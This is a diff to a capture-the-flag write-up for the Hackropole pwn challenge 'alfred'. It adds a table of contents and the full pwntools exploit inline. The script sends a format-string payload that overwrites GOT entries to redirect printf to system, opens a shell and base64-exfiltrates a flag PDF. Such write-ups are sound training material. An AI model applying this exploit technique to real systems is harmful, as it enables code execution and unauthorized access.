@@ -4,6 +4,10 @@ title = "Hackropole | Alfred"
 
 # [Pwn] alfred | hackropole
 
+* [1. Checksec](#checksec)
+* [2. Writeup](#writeup)
+* [3. Full exploit](#full-exploit)
+
 ## Checksec
 
 ```bash
@@ -44,6 +48,41 @@ So we gain the shell but we still have to get the flag, so we're gonna use `base
 
 ![flag](/images/alfred/flag.png)
 
-you can get the full exploit [here](/exploits/alfred.py)
+## Full exploit
+
+```python
+from pwn import *
+import pdftotext
+import base64
+
+def exploit(io, elf, libc=None):
+    io.sendlineafter(b'>>> ', b'Alma_and_Pat')
+
+    offset = 7
+    writes = {
+            elf.got['putc']: elf.sym['todo_scripts'],
+            elf.got['printf']: elf.sym['system']
+    }
+
+    payload = fmtstr_payload(offset, writes)
+    io.sendlineafter(b'>>> ', payload)
+    io.sendline(b'/bin/sh')
+    io.recvuntil(b'sh: 1: Hello: not found')
+    read_files('script_flag.pdf', io)
+
+def read_files(file, io):
+    io.sendline(f'base64 {file}'.encode('utf-8'))
+    flag = io.recvuntil(b'==')
+    flag = base64.b64decode(flag.replace(b'\n', b''))
+
+    with open('flag.pdf', 'w+b') as f:
+        f.write(flag)
+    
+    with open('flag.pdf', 'rb') as f:
+        flag = pdftotext.PDF(f)
+        io.success(f'flag: {("".join(flag)).replace(chr(0xa), "")}')
+```
+
+[download here](/exploits/alfred.py)
 
 **Writed by *0xB0tm4n***
